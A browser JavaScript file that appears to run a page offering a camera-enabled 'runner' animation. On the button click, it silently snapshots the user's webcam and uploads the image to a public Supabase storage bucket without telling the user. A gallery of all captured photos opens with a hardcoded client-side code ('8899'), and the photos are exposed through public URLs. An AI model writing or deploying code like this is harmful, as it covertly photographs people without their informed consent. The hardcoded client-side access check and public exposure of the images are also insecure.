// ---------------------------
// Supabase client setup
// ---------------------------
const SUPABASE_URL = "https://edafkomypijighnizyee.supabase.co";
const SUPABASE_KEY = "sb_publishable_pR7et-ooMnmBQus4X5vHRg_-1O4_OSi";

// Correct global: Supabase (capital S)
const supabaseClient = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// ---------------------------
// Elements
// ---------------------------
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const gallery = document.getElementById("gallery");
const runner = document.getElementById("runner");
const enableBtn = document.getElementById("enableCamera");

console.log("[DEBUG] Script loaded");

// ---------------------------
// Runner animation
// ---------------------------
function startRunner() {
  console.log("[DEBUG] Runner started");
  runner.style.animation = "move 3s linear infinite";
}

// ---------------------------
// Camera capture & upload
// ---------------------------
enableBtn.addEventListener("click", async () => {
  console.log("[DEBUG] Enable Camera clicked");
  enableBtn.style.display = "none";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    console.log("[DEBUG] Camera stream obtained");
    video.srcObject = stream;
    video.style.display = "block";

    video.onloadedmetadata = async () => {
      console.log("[DEBUG] Video loaded, taking snapshot");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
      const filename = `photo_${Date.now()}.png`;
      console.log("[DEBUG] Snapshot blob created:", filename);

      // Upload to Supabase
      const { error } = await supabaseClient.storage.from("photos").upload(filename, blob);
      if (error) {
        console.error("[DEBUG] Upload failed:", error.message);
      } else {
        console.log("[DEBUG] Upload successful:", filename);
        startRunner();
      }
    };
  } catch (err) {
    console.error("[DEBUG] Camera error:", err);
    alert("Camera permission denied or error occurred");
  }
});

// ---------------------------
// Unlock gallery
// ---------------------------
async function checkCode() {
  const code = document.getElementById("code").value.trim();
  console.log("[DEBUG] Code entered:", code);
  if (code === "8899") {
    await loadGallery();
  } else {
    alert("ACCESS DENIED");
    console.log("[DEBUG] Wrong code");
  }
}

// ---------------------------
// Load images from Supabase
// ---------------------------
async function loadGallery() {
  gallery.innerHTML = "";
  console.log("[DEBUG] Loading gallery from Supabase");

  const { data: files, error } = await supabaseClient.storage.from("photos").list("", {
    limit: 100,
    sortBy: { column: "name", order: "desc" }
  });

  if (error) {
    console.error("[DEBUG] Error fetching files:", error.message);
    return;
  }

  if (!files || files.length === 0) {
    gallery.innerHTML = "<p>No photos yet.</p>";
    console.log("[DEBUG] No photos in bucket");
    return;
  }

  console.log("[DEBUG] Files found:", files.map(f => f.name));

  files.forEach(file => {
    const { data: urlObj } = supabaseClient.storage.from("photos").getPublicUrl(file.name);
    console.log("[DEBUG] Public URL:", urlObj.publicUrl);

    const img = document.createElement("img");
    img.src = urlObj.publicUrl;
    img.alt = file.name;
    gallery.appendChild(img);
  });

  console.log("[DEBUG] Gallery loaded");
}
